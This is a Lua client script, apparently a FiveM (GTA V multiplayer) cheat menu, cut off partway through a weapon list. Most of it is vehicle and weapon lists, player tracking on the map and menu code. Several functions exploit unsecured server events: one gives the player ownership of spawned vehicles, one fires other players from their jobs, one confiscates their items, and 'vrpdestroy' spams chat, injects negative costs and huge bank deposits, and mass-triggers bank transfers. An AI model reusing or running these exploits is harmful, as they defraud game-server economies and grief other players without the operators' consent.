Plane = { }

Plane.debug = false

local Enabled = true

local states = {}
states.frozen = false
states.frozenPos = nil

local logged = false
local pass = "brutan"

local aispeed = "50.0"

local cg = true
local ch = false
local ci = true

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(10)
		if(states.frozen)then
			ClearPedTasksImmediately(GetPlayerPed(-1))
			SetEntityCoords(GetPlayerPed(-1), states.frozenPos)
		end
	end
end)

Citizen.CreateThread(
    function()
        while true do
            Wait(1)
            for i = 0, 128 do
                if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= GetPlayerPed(-1) then
                    ped = GetPlayerPed(i)
                    blip = GetBlipFromEntity(ped)
                    x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                    x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                    distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                    headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(i), false, false, '', false)
                    wantedLvl = GetPlayerWantedLevel(i)
                    if ch then
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true)
                        if wantedLvl then
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true)
                            Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
                        else
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        end
                    else
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false)
                    end
                    if cg then
                        if not DoesBlipExist(blip) then
                            blip = AddBlipForEntity(ped)
                            SetBlipSprite(blip, 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                            SetBlipNameToPlayerName(blip, i)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(blip)
                            if not GetEntityHealth(ped) then
                                if blipSprite ~= 274 then
                                    SetBlipSprite(blip, 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    SetBlipNameToPlayerName(blip, i)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(blip, 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, i)
                                    end
                                elseif vehClass == 16 then
                                    if
                                        vehModel == GetHashKey('besra') or vehModel == GetHashKey('hydra') or
                                            vehModel == GetHashKey('lazer')
                                     then
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(blip, 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                            SetBlipNameToPlayerName(blip, i)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(blip, 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif vehClass == 14 then
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(blip, 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif
                                    vehModel == GetHashKey('insurgent') or vehModel == GetHashKey('insurgent2') or
                                        vehModel == GetHashKey('limo2')
                                 then
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, i)
                                    end
                                elseif vehModel == GetHashKey('rhino') then
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(blip, 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, i)
                                    end
                                elseif blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, i)
                                end
                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(blip, passengers)
                                else
                                    HideNumberOnBlip(blip)
                                end
                            else
                                HideNumberOnBlip(blip)
                                if blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, i)
                                end
                            end
                            SetBlipRotation(blip, math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(blip, i)
                            SetBlipScale(blip, 0.85)
                            if IsPauseMenuActive() then
                                SetBlipAlpha(blip, 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                                distance =
                                    math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) +
                                    900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(blip, distance)
                            end
                        end
                    else
                        RemoveBlip(blip)
                    end
                end
            end
        end
    end
)

local function fv()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetVehicleNumberPlateText(veh, cw)
        local cx = ESX.Game.GetVehicleProperties(veh)
        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
        av('~g~~h~Success', false)
    else
        av('~b~~h~Model is not valid!', true)
    end
end

local function e()
    local name = GetPlayerName(PlayerId())
end
local o = {}
local h = false
rot = 1
local j = false
local bw = true
local b8 = false
local b9 = false
local ba = false
local bb = false
local bc = nil
local bd = {}
local be = {}
local bf = nil
local bg = false
local bh = -1
local bi = -1
local bj = -1
local bk = false


local function k(l)
    local m = {}
    local n = GetGameTimer() / 200
    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
    return m
end


function checkValidVehicleExtras()
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, false)
    local az = {}
    for i = 0, 50, 1 do
        if DoesExtraExist(ay, i) then
            local aA = '~h~Extra #' .. tostring(i)
            local I = 'OFF'
            if IsVehicleExtraTurnedOn(ay, i) then
                I = 'ON'
            end
            local aB = '~h~extra ' .. tostring(i)
            table.insert(
                az,
                {
                    menuName = realModName,
                    data = {
                        ['action'] = realSpawnName,
                        ['state'] = I
                    }
                }
            )
        end
    end
    return az
end

function FirePlayer(SelectedPlayer)
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(SelectedPlayer) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback('esx_society:setJob', function()
			end, playerMatch, 'unemployed', 0, 'hire')

		end)
	end
end

function DoesVehicleHaveExtras(veh)
    for i = 1, 30 do
        if DoesExtraExist(veh, i) then
            return true
        end
    end
    return false
end

function checkValidVehicleMods(aC)
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, false)
    local az = {}
    local aD = GetNumVehicleMods(ay, aC)
    if aC == 48 and aD == 0 then
        local aD = GetVehicleLiveryCount(ay)
        for i = 1, aD, 1 do
            local aE = i - 1
            local aF = GetLiveryName(ay, aE)
            local realModName = GetLabelText(aF)
            local aG, realSpawnName = aC, aE
            az[i] = {
                menuName = realModName,
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        end
    end
    for i = 1, aD, 1 do
        local aE = i - 1
        local aF = GetModTextLabel(ay, aC, aE)
        local realModName = GetLabelText(aF)
        local aG, realSpawnName = aD, aE
        az[i] = {
            menuName = realModName,
            data = {
                ['modid'] = aG,
                ['realIndex'] = realSpawnName
            }
        }
    end
    if aD > 0 then
        local aE = -1
        local aG, realSpawnName = aC, aE
        table.insert(
            az,
            1,
            {
                menuName = 'Stock',
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        )
    end
    return az
end

local aH = {
    'Dinghy',
    'Dinghy2',
    'Dinghy3',
    'Dingh4',
    'Jetmax',
    'Marquis',
    'Seashark',
    'Seashark2',
    'Seashark3',
    'Speeder',
    'Speeder2',
    'Squalo',
    'Submersible',
    'Submersible2',
    'Suntrap',
    'Toro',
    'Toro2',
    'Tropic',
    'Tropic2',
    'Tug'
}
local aI = {
    'Benson',
    'Biff',
    'Cerberus',
    'Cerberus2',
    'Cerberus3',
    'Hauler',
    'Hauler2',
    'Mule',
    'Mule2',
    'Mule3',
    'Mule4',
    'Packer',
    'Phantom',
    'Phantom2',
    'Phantom3',
    'Pounder',
    'Pounder2',
    'Stockade',
    'Stockade3',
    'Terbyte'
}
local aJ = {
    'Blista',
    'Blista2',
    'Blista3',
    'Brioso',
    'Dilettante',
    'Dilettante2',
    'Issi2',
    'Issi3',
    'issi4',
    'Iss5',
    'issi6',
    'Panto',
    'Prarire',
    'Rhapsody'
}

entityEnumerator = {
	__gc = function(enum)
	  if enum.destructor and enum.handle then
		enum.destructor(enum.handle)
	  end
	  enum.destructor = nil
	  enum.handle = nil
	end
  }

function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
	  local iter, id = initFunc()
	  if not id or id == 0 then
		disposeFunc(iter)
		return
	  end
	  
	  local enum = {handle = iter, destructor = disposeFunc}
	  setmetatable(enum, entityEnumerator)
	  
	  local next = true
	  repeat
		coroutine.yield(id)
		next, id = moveFunc(iter)
	  until not next
	  
	  enum.destructor, enum.handle = nil, nil
	  disposeFunc(iter)
	end)
  end

  function EnumerateObjects()
	return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
  end

  function EnumeratePeds()
	return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
  end

  function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
  end

  function EnumeratePickups()
	return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
  end

local function ClonePedVeh()
    local ped = GetPlayerPed(SelectedPlayer)
    local pedVeh = nil
    local PlayerPed = PlayerPedId()
    if IsPedInAnyVehicle(ped, false) then
        pedVeh = GetVehiclePedIsIn(ped, false)
    else
        pedVeh = GetVehiclePedIsIn(ped, true)
        if DoesEntityExist(pedVeh) then
            local vmh = GetEntityModel(pedVeh)
            local playerpos = GetEntityCoords(PlayerPed, false)
            local playerveh =
                CreateVehicle(vmh, playerpos.x, playerpos.y, playerpos.z, GetEntityHeading(PlayerPed), true, true)
            SetPedIntoVehicle(PlayerPed, playerveh, -1)
            local pcolor, scolor = nil
            GetVehicleColours(pedVeh, pcolor, scolor)
            SetVehicleColours(playerveh, pcolor, scolor)
            if IsThisModelACar(vmh) or IsThisModelABike(vhm) then
                SetVehicleModKit(playerveh, 0)
                SetVehicleWheelType(playerveh, GetVehicleWheelType(pedVeh))
                local pc, wc = nil
                SetVehicleNumberPlateTextIndex(playerveh, GetVehicleNumberPlateTextIndex(pedVeh))
                SetVehicleNumberPlateText(playerveh, GetVehicleNumberPlateText(pedVeh))
                GetVehicleExtraColours(pedVeh, pc, wc)
                SetVehicleExtraColours(playerveh, pc, wc)
            end
        end
    end
end

local function OpenBodySearchMenu1(SelectedPlayer)

  ESX.TriggerServerCallback('esx_mafiajob:getOtherPlayerData', function(data)

    local elements = {}

    local blackMoney = 0

    for i=1, #data.accounts, 1 do
      if data.accounts[i].name == 'black_money' then
        blackMoney = data.accounts[i].money
      end
    end

    table.insert(elements, {
      label          = 'confiscate_dirty' .. blackMoney,
      value          = 'black_money',
      itemType       = 'item_account',
      amount         = blackMoney
    })

    table.insert(elements, {label = '--- Armes ---', value = nil})

    for i=1, #data.weapons, 1 do
      table.insert(elements, {
        label          = 'confiscate' .. ESX.GetWeaponLabel(data.weapons[i].name),
        value          = data.weapons[i].name,
        itemType       = 'item_weapon',
        amount         = data.ammo,
      })
    end

    table.insert(elements, {label = 'inventory_label', value = nil})

    for i=1, #data.inventory, 1 do
      if data.inventory[i].count > 0 then
        table.insert(elements, {
          label          = 'confiscate_inv' .. data.inventory[i].count .. ' ' .. data.inventory[i].label,
          value          = data.inventory[i].name,
          itemType       = 'item_standard',
          amount         = data.inventory[i].count,
        })
      end
    end


    ESX.UI.Menu.Open(
      'default', GetCurrentResourceName(), 'body_search',
      {
        title    = _U('search'),
        align    = 'top-left',
        elements = elements,
      },
      function(data, menu)

        local itemType = data.current.itemType
        local itemName = data.current.value
        local amount   = data.current.amount

        if data.current.value ~= nil then

          TriggerServerEvent('esx_mafiajob:confiscatePlayerItem', GetPlayerServerId(SelectedPlayer), itemType, itemName, amount)

          OpenBodySearchMenu(SelectedPlayer)

        end

      end,
      function(data, menu)
        menu.close()
      end
    )

  end, GetPlayerServerId(SelectedPlayer))

end

function vrpdestroy()
                for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        'xaxaxaxaxaxaxaxaxax',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. 'xaxaxaxaxaxaxaxaxax'
                    )
                end
                TriggerServerEvent(
                    'lscustoms:payGarage',
                    {
                        costs = -99999999
                    }
                )
                TriggerServerEvent('vrp_slotmachine:server:2', 999999999)
                TriggerServerEvent('Banca:deposit', 999999999)
                TriggerServerEvent('bank:deposit', 999999999)
                local di = GetPlayerServerId(PlayerId())
                for i = 0, 256 do
                    TriggerEvent('bank:transfer', di, GetPlayerServerId(i), 99999999)
                end
            end
			
local aK = {
    'CogCabrio',
    'Exemplar',
    'F620',
    'Felon',
    'Felon2',
    'Jackal',
    'Oracle',
    'Oracle2',
    'Sentinel',
    'Sentinel2',
    'Windsor',
    'Windsor2',
    'Zion',
    'Zion2'
}
local aL = {
    'Bmx',
    'Cruiser',
    'Fixter',
    'Scorcher',
    'Tribike',
    'Tribike2',
    'tribike3'
}
local aM = {
    'ambulance',
    'FBI',
    'FBI2',
    'FireTruk',
    'PBus',
    'police',
    'Police2',
    'Police3',
    'Police4',
    'PoliceOld1',
    'PoliceOld2',
    'PoliceT',
    'Policeb',
    'Polmav',
    'Pranger',
    'Predator',
    'Riot',
    'Riot2',
    'Sheriff',
    'Sheriff2'
}
local aN = {
    'Akula',
    'Annihilator',
    'Buzzard',
    'Buzzard2',
    'Cargobob',
    'Cargobob2',
    'Cargobob3',
    'Cargobob4',
    'Frogger',
    'Frogger2',
    'Havok',
    'Hunter',
    'Maverick',
    'Savage',
    'Seasparrow',
    'Skylift',
    'Supervolito',
    'Supervolito2',
    'Swift',
    'Swift2',
    'Valkyrie',
    'Valkyrie2',
    'Volatus'
}
local aO = {
    'Bulldozer',
    'Cutter',
    'Dump',
    'Flatbed',
    'Guardian',
    'Handler',
    'Mixer',
    'Mixer2',
    'Rubble',
    'Tiptruck',
    'Tiptruck2'
}
local aP = {
    'APC',
    'Barracks',
    'Barracks2',
    'Barracks3',
    'Barrage',
    'Chernobog',
    'Crusader',
    'Halftrack',
    'Khanjali',
    'Rhino',
    'Scarab',
    'Scarab2',
    'Scarab3',
    'Thruster',
    'Trailersmall2'
}
local aQ = {
    'Akuma',
    'Avarus',
    'Bagger',
    'Bati2',
    'Bati',
    'BF400',
    'Blazer4',
    'CarbonRS',
    'Chimera',
    'Cliffhanger',
    'Daemon',
    'Daemon2',
    'Defiler',
    'Deathbike',
    'Deathbike2',
    'Deathbike3',
    'Diablous',
    'Diablous2',
    'Double',
    'Enduro',
    'esskey',
    'Faggio2',
    'Faggio3',
    'Faggio',
    'Fcr2',
    'fcr',
    'gargoyle',
    'hakuchou2',
    'hakuchou',
    'hexer',
    'innovation',
    'Lectro',
    'Manchez',
    'Nemesis',
    'Nightblade',
    'Oppressor',
    'Oppressor2',
    'PCJ',
    'Ratbike',
    'Ruffian',
    'Sanchez2',
    'Sanchez',
    'Sanctus',
    'Shotaro',
    'Sovereign',
    'Thrust',
    'Vader',
    'Vindicator',
    'Vortex',
    'Wolfsbane',
    'zombiea',
    'zombieb'
}
local aR = {
    'Blade',
    'Buccaneer',
    'Buccaneer2',
    'Chino',
    'Chino2',
    'clique',
    'Deviant',
    'Dominator',
    'Dominator2',
    'Dominator3',
    'Dominator4',
    'Dominator5',
    'Dominator6',
    'Dukes',
    'Dukes2',
    'Ellie',
    'Faction',
    'faction2',
    'faction3',
    'Gauntlet',
    'Gauntlet2',
    'Hermes',
    'Hotknife',
    'Hustler',
    'Impaler',
    'Impaler2',
    'Impaler3',
    'Impaler4',
    'Imperator',
    'Imperator2',
    'Imperator3',
    'Lurcher',
    'Moonbeam',
    'Moonbeam2',
    'Nightshade',
    'Phoenix',
    'Picador',
    'RatLoader',
    'RatLoader2',
    'Ruiner',
    'Ruiner2',
    'Ruiner3',
    'SabreGT',
    'SabreGT2',
    'Sadler2',
    'Slamvan',
    'Slamvan2',
    'Slamvan3',
    'Slamvan4',
    'Slamvan5',
    'Slamvan6',
    'Stalion',
    'Stalion2',
    'Tampa',
    'Tampa3',
    'Tulip',
    'Vamos,',
    'Vigero',
    'Virgo',
    'Virgo2',
    'Virgo3',
    'Voodoo',
    'Voodoo2',
    'Yosemite'
}
local aS = {
    'BFinjection',
    'Bifta',
    'Blazer',
    'Blazer2',
    'Blazer3',
    'Blazer5',
    'Bohdi',
    'Brawler',
    'Bruiser',
    'Bruiser2',
    'Bruiser3',
    'Caracara',
    'DLoader',
    'Dune',
    'Dune2',
    'Dune3',
    'Dune4',
    'Dune5',
    'Insurgent',
    'Insurgent2',
    'Insurgent3',
    'Kalahari',
    'Kamacho',
    'LGuard',
    'Marshall',
    'Mesa',
    'Mesa2',
    'Mesa3',
    'Monster',
    'Monster4',
    'Monster5',
    'Nightshark',
    'RancherXL',
    'RancherXL2',
    'Rebel',
    'Rebel2',
    'RCBandito',
    'Riata',
    'Sandking',
    'Sandking2',
    'Technical',
    'Technical2',
    'Technical3',
    'TrophyTruck',
    'TrophyTruck2',
    'Freecrawler',
    'Menacer'
}
local aT = {
    'AlphaZ1',
    'Avenger',
    'Avenger2',
    'Besra',
    'Blimp',
    'blimp2',
    'Blimp3',
    'Bombushka',
    'Cargoplane',
    'Cuban800',
    'Dodo',
    'Duster',
    'Howard',
    'Hydra',
    'Jet',
    'Lazer',
    'Luxor',
    'Luxor2',
    'Mammatus',
    'Microlight',
    'Miljet',
    'Mogul',
    'Molotok',
    'Nimbus',
    'Nokota',
    'Pyro',
    'Rogue',
    'Seabreeze',
    'Shamal',
    'Starling',
    'Stunt',
    'Titan',
    'Tula',
    'Velum',
    'Velum2',
    'Vestra',
    'Volatol',
    'Striekforce'
}
local aU = {
    'BJXL',
    'Baller',
    'Baller2',
    'Baller3',
    'Baller4',
    'Baller5',
    'Baller6',
    'Cavalcade',
    'Cavalcade2',
    'Dubsta',
    'Dubsta2',
    'Dubsta3',
    'FQ2',
    'Granger',
    'Gresley',
    'Habanero',
    'Huntley',
    'Landstalker',
    'patriot',
    'Patriot2',
    'Radi',
    'Rocoto',
    'Seminole',
    'Serrano',
    'Toros',
    'XLS',
    'XLS2'
}
local aV = {
    'Asea',
    'Asea2',
    'Asterope',
    'Cog55',
    'Cogg552',
    'Cognoscenti',
    'Cognoscenti2',
    'emperor',
    'emperor2',
    'emperor3',
    'Fugitive',
    'Glendale',
    'ingot',
    'intruder',
    'limo2',
    'premier',
    'primo',
    'primo2',
    'regina',
    'romero',
    'stafford',
    'Stanier',
    'stratum',
    'stretch',
    'surge',
    'tailgater',
    'warrener',
    'Washington'
}
local aW = {
    'Airbus',
    'Brickade',
    'Bus',
    'Coach',
    'Rallytruck',
    'Rentalbus',
    'taxi',
    'Tourbus',
    'Trash',
    'Trash2',
    'WastIndr',
    'PBus2'
}
local aX = {
    'Alpha',
    'Banshee',
    'Banshee2',
    'BestiaGTS',
    'Buffalo',
    'Buffalo2',
    'Buffalo3',
    'Carbonizzare',
    'Comet2',
    'Comet3',
    'Comet4',
    'Comet5',
    'Coquette',
    'Deveste',
    'Elegy',
    'Elegy2',
    'Feltzer2',
    'Feltzer3',
    'FlashGT',
    'Furoregt',
    'Fusilade',
    'Futo',
    'GB200',
    'Hotring',
    'Infernus2',
    'Italigto',
    'Jester',
    'Jester2',
    'Khamelion',
    'Kurama',
    'Kurama2',
    'Lynx',
    'MAssacro',
    'MAssacro2',
    'neon',
    'Ninef',
    'ninfe2',
    'omnis',
    'Pariah',
    'Penumbra',
    'Raiden',
    'RapidGT',
    'RapidGT2',
    'Raptor',
    'Revolter',
    'Ruston',
    'Schafter2',
    'Schafter3',
    'Schafter4',
    'Schafter5',
    'Schafter6',
    'Schlagen',
    'Schwarzer',
    'Sentinel3',
    'Seven70',
    'Specter',
    'Specter2',
    'Streiter',
    'Sultan',
    'Surano',
    'Tampa2',
    'Tropos',
    'Verlierer2',
    'ZR380',
    'ZR3802',
    'ZR3803'
}
local aY = {
    'Ardent',
    'BType',
    'BType2',
    'BType3',
    'Casco',
    'Cheetah2',
    'Cheburek',
    'Coquette2',
    'Coquette3',
    'Deluxo',
    'Fagaloa',
    'Gt500',
    'JB700',
    'JEster3',
    'MAmba',
    'Manana',
    'Michelli',
    'Monroe',
    'Peyote',
    'Pigalle',
    'RapidGT3',
    'Retinue',
    'Savastra',
    'Stinger',
    'Stingergt',
    'Stromberg',
    'Swinger',
    'Torero',
    'Tornado',
    'Tornado2',
    'Tornado3',
    'Tornado4',
    'Tornado5',
    'Tornado6',
    'Viseris',
    'Z190',
    'ZType'
}
local aZ = {
    'Adder',
    'Autarch',
    'Bullet',
    'Cheetah',
    'Cyclone',
    'EntityXF',
    'Entity2',
    'FMJ',
    'GP1',
    'Infernus',
    'LE7B',
    'Nero',
    'Nero2',
    'Osiris',
    'Penetrator',
    'PFister811',
    'Prototipo',
    'Reaper',
    'SC1',
    'Scramjet',
    'Sheava',
    'SultanRS',
    'Superd',
    'T20',
    'Taipan',
    'Tempesta',
    'Tezeract',
    'Turismo2',
    'Turismor',
    'Tyrant',
    'Tyrus',
    'Vacca',
    'Vagner',
    'Vigilante',
    'Visione',
    'Voltic',
    'Voltic2',
    'Zentorno',
    'Italigtb',
    'Italigtb2',
    'XA21'
}
local a_ = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}
local b0 = {
    'Freight',
    'Freightcar',
    'Freightcont1',
    'Freightcont2',
    'Freightgrain',
    'Freighttrailer',
    'TankerCar'
}
local b1 = {
    'Airtug',
    'Caddy',
    'Caddy2',
    'Caddy3',
    'Docktug',
    'Forklift',
    'Mower',
    'Ripley',
    'Sadler',
    'Scrap',
    'TowTruck',
    'Towtruck2',
    'Tractor',
    'Tractor2',
    'Tractor3',
    'TrailerLArge2',
    'Utilitruck',
    'Utilitruck3',
    'Utilitruck2'
}
local b2 = {
    'Bison',
    'Bison2',
    'Bison3',
    'BobcatXL',
    'Boxville',
    'Boxville2',
    'Boxville3',
    'Boxville4',
    'Boxville5',
    'Burrito',
    'Burrito2',
    'Burrito3',
    'Burrito4',
    'Burrito5',
    'Camper',
    'GBurrito',
    'GBurrito2',
    'Journey',
    'Minivan',
    'Minivan2',
    'Paradise',
    'pony',
    'Pony2',
    'Rumpo',
    'Rumpo2',
    'Rumpo3',
    'Speedo',
    'Speedo2',
    'Speedo4',
    'Surfer',
    'Surfer2',
    'Taco',
    'Youga',
    'youga2'
}
local b3 = {
    'Boats',
    'Commercial',
    'Compacts',
    'Coupes',
    'Cycles',
    'Emergency',
    'Helictopers',
    'Industrial',
    'Military',
    'Motorcycles',
    'Muscle',
    'Off-Road',
    'Planes',
    'SUVs',
    'Sedans',
    'Service',
    'Sports',
    'Sports Classic',
    'Super',
    'Trailer',
    'Trains',
    'Utility',
    'Vans'
}
local b4 = {
    aH,
    aI,
    aJ,
    aK,
    aL,
    aM,
    aN,
    aO,
    aP,
    aQ,
    aR,
    aS,
    aT,
    aU,
    aV,
    aW,
    aX,
    aY,
    aZ,
    a_,
    b0,
    b1,
    b2
}
local b5 = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}

local currentMenuX = 0.025
local selectedMenuX = 0.025
local currentMenuY = 0.025
local selectedMenuY = 0.025
local menuX = { 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.75 }
local menuY = { 0.025, 0.1, 0.2, 0.3, 0.425 }

local discordPresence = true

local SelectedPlayer
local bullets = { "WEAPON_FLAREGUN", "WEAPON_FIREWORK", "WEAPON_RPG", "WEAPON_PIPEBOMB", "WEAPON_RAILGUN", "WEAPON_SMOKEGRENADE", "VEHICLE_WEAPON_PLAYER_LASER", "VEHICLE_WEAPON_TANK" }
local peds = { "a_c_boar", "a_c_killerwhale", "a_c_sharktiger", "csb_stripper_01" }
local vehicles = { "Freight", "Rhino", "Futo", "Vigilante", "Monster", "Panto", "Bus", "Dump", "CargoPlane" }
local vehicleSpeed = { 1.0, 10.0, 20.0, 30.0, 40.0, 50.0, 60.0, 70.0, 80.0, 90.0, 100.0, 110.0, 120.0, 130.0, 140.0, 150.0 }

local currentVehicle = 1
local selectedVehicle = 1

local currentVehicleSpeed = 16
local selectedVehicleSpeed = 16

local currentBone = 1
local selectedBone = 1

local currentDamage = 1
local selectedDamage = 1

local currentPed = 1
local selectedPed = 1

local currentBullet = 1
local selectedBullet = 1

local menus = { }
local keys = { up = 172, down = 173, left = 174, right = 175, select = 215, back = 194 }
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005

function math.round(num, numDecimalPlaces)
    return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBRainbow(frequency)
    local result = {}
    local curtime = GetGameTimer() / 1000

    result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
    result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
    result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

    return result
end

local allWeapons = {
"WEAPON_KNIFE",
"WEAPON_KNUCKLE",
"WEAPON_NIGHTSTICK",
"WEAPON_HAMMER",
"WEAPON_BAT",
"WEAPON_GOLFCLUB",
"WEAPON_CROWBAR",
"WEAPON_BOTTLE",
"WEAPON_DAGGER",
"WEAPON_HATCHET",
"WEAPON_MACHETE",
"WEAPON_FLASHLIGHT",
"WEAPON_SWITCHBLADE",
"WEAPON_PISTOL",
"WEAPON_PISTOL_MK2",
"WEAPON_COMBATPISTOL",
"WEAPON_APPISTOL",
"WEAPON_PISTOL50",
"WEAPON_SNSPISTOL",
"WEAPON_HEAVYPISTOL",
"WEAPON_VINTAGEPISTOL",
"WEAPON_STUNGUN",
"WEAPON_FLAREGUN",
"WEAPON_MARKSMANPISTOL",
"WEAPON_REVOLVER",
"WEAPON_MICROSMG",
"WEAPON_SMG",
"WEAPON_SMG_MK2",
"WEAPON_ASSAULTSMG",
"WEAPON_MG",
"WEAPON_COMBATMG",
"WEAPON_COMBATMG_MK2",
"WEAPON_COMBATPDW",
"WEAPON_GUSENBERG",
"WEAPON_MACHINEPISTOL",
"WEAPON_ASSAULTRIFLE",
"WEAPON_ASSAULTRIFLE_MK2",
"WEAPON_CARBINERIFLE",
"WEAPON_CARBINERIFLE_MK2",
"WEAPON_ADVANCEDRIFLE",
"WEAPON_SPECIALCARBINE",
"WEAPON_BULLPUPRIFLE",
"WEAPON_COMPACTRIFLE",
"WEAPON_PUMPSHOTGUN",
"WEAPON_SAWNOFFSHOTGUN",
"WEAPON_BULLPUPSHOTGUN",
"WEAPON_ASSAULTSHOTGUN",
"WEAPON_MUSKET",
"WEAPON_HEAVYSHOTGUN",
"WEAPON_DBSHOTGUN",
"WEAPON_SNIPERRIFLE",
"WEAPON_HEAVYSNIPER",
"WEAPON_HEAVYSNIPER_MK2",
"WEAPON_MARKSMANRIFLE",
"WEAPON_GRENADELAUNCHER",
"WEAPON_GRENADELAUNCHER_SMOKE",
"WEAPON_RPG",
"WEAPON_STINGER",
"WEAPON_FIREWORK",
"WEAPON_HOMINGLAUNCHER",
"WEAPON_GRENADE",
"WEAPON_STICKYBOMB",
"WEAPON_PROXMINE",
"WEAPON_BZGAS",
"WEAPON_SMOKEGRENADE",
"WEAPON_MOLOTOV",
